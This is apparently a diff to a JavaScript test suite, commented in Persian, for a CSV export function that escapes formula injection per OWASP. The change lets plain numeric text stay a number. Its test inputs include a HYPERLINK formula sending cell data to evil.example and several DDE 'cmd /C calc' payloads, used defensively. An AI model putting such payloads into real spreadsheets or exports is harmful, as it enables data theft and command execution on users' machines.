@@ -4,6 +4,7 @@
  * (دانلودِ واقعیِ هر چهار خروجیِ صفحه در کرومیوم: `test/web-csv-export.mjs`.)
  *
  *   ⛔ متنِ آغازشده با `=` `+` `-` `@` تب یا CR ⇒ «'» پیشش (OWASP)؛ عدد (typeof number) همان عدد، منفی هم؛ null/undefined ⇒ خالی.
+ *   ⛔ جز متنِ فقط-عدد `^-?[0-9]+(\.[0-9]+)?$` (همان خانهٔ `g` ِ xlsx ِ `owner-export.js`): «-500.00» عدد می‌ماند؛ هر چیزِ دیگر نه.
  *   ⛔ مقدارِ هر خانه پس از خواندنِ CSV با سرور یکی است؛ تنها فرقِ متن: `;` ِ پیشینِ صفحه هم نقل‌قول می‌شود.
  *   ⛔ بارکننده `shop-sync.js`، سرویس‌ورکر، index.html ِ یخ‌زده دست‌نخورده و `downloadCsv` ِ صفحه همان `csvCell` ِ سراسری را می‌خواند.
  */
@@ -24,6 +25,8 @@ const unquote = (s) => (s.startsWith('"') ? s.slice(1, -1).replace(/""/g, '"') :
 const INPUTS = [
   '=HYPERLINK("http://evil.example/?x="&A1,"کلیک")', '=1+1', '+SUM(1,2)', '-2+3', "@SUM(1+1)*cmd|' /C calc'!A0", '\t=1+1', '\r=1+1',
   '-500', '-', '+', '=', '@', "'=1", ' =1', 'چای سبز', 'a,b', 'a"b', 'a\nb', 'a\r\nb', 'a;b', '=a;b', '', '0', '1e5',
+  '-500.00', '-0', '-0.5', '-1e5', '+500', '-.5', '- 500', '-500.', '--5', '-500\n', '-500 ', '-۵۰۰', '-150.00%', '-1,000', '=500', '@500',
+  '\t500', '-5-5', '-5.5.5', '0.5', '500',
   -500, 500, 0, -0, 12.5, -0.25, NaN, true, false, null, undefined, 1234567890123,
 ];
 
@@ -41,12 +44,31 @@ test('فرمول بسته، عددِ منفی عدد، متنِ عادی دست�
   assert.equal(W.cell('\t=1'), "'\t=1");
   assert.equal(W.cell('\r=1'), '"\'\r=1"');
   assert.equal(W.cell(-500), '-500', 'عددِ منفی (ستونِ مبلغ) عدد می‌ماند');
-  assert.equal(W.cell('-500'), "'-500", 'متنِ عددنما همان قاعدهٔ سرور');
+  assert.equal(W.cell('-500'), '-500', 'متنِ فقط-عدد فرمول نیست ⇒ عدد');
   assert.equal(W.cell('چای سبز'), 'چای سبز');
   assert.equal(W.cell('a;b'), '"a;b"', 'نقل‌قولِ `;` ِ پیشینِ صفحه می‌ماند');
   assert.equal(W.cell(null), '');
   assert.equal(W.cell(undefined), '');
-  for (const v of INPUTS) assert.ok(!/^[=+\-@\t\r]/.test(unquote(W.cell(v))) || typeof v === 'number', JSON.stringify(v));
+  for (const v of INPUTS) {
+    const ok = !/^[=+\-@\t\r]/.test(unquote(W.cell(v))) || typeof v === 'number' || /^-?[0-9]+(\.[0-9]+)?$/.test(v);
+    assert.ok(ok, JSON.stringify(v));
+  }
+});
+
+test('متنِ فقط-عدد (همان خانهٔ `g` ِ xlsx) عدد می‌ماند؛ هر شکلِ دیگرِ آغازشده با = + - @ تب CR «\'» می‌گیرد — سرور و وب', () => {
+  //  همان یک الگو در سه جا (xlsx ِ وب، CSV ِ وب، CSV ِ سرور) — یکی بی دیگری عوض نشود
+  const PATTERN = '/^-?[0-9]+(\\.[0-9]+)?$/';
+  for (const f of ['license/owner-export.js', 'license/csv-cell.js', 'server/src/lib/finance-reports.js']) {
+    assert.ok(read(f).includes(PATTERN), `${f}: ${PATTERN}`);
+  }
+  const plain = ['-500', '-500.00', '-0', '-0.5', '-1234567.89'];
+  const prefixed = { '-2+3': "'-2+3", '-1e5': "'-1e5", '+500': "'+500", '-.5': "'-.5", '- 500': "'- 500", '-500.': "'-500.", '--5': "'--5",
+    '-500 ': "'-500 ", '-۵۰۰': "'-۵۰۰", '-150.00%': "'-150.00%", '-1,000': '"\'-1,000"', '-500\n': '"\'-500\n"', '=500': "'=500",
+    '@500': "'@500", '\t500': "'\t500", '-5-5': "'-5-5", '-5.5.5': "'-5.5.5", '-1+1+cmd|\' /C calc\'!A0': "'-1+1+cmd|' /C calc'!A0" };
+  for (const fn of [W.cell, server]) {
+    for (const v of plain) assert.equal(fn(v), v, `فقط-عدد: ${v}`);
+    for (const [v, want] of Object.entries(prefixed)) assert.equal(fn(v), want, `فرمول‌نما: ${JSON.stringify(v)}`);
+  }
 });
 
 test('نصب: `csvCell` ِ سراسری ⇐ `cell`؛ بی آن (Node، صفحهٔ دیگر) هیچ', () => {
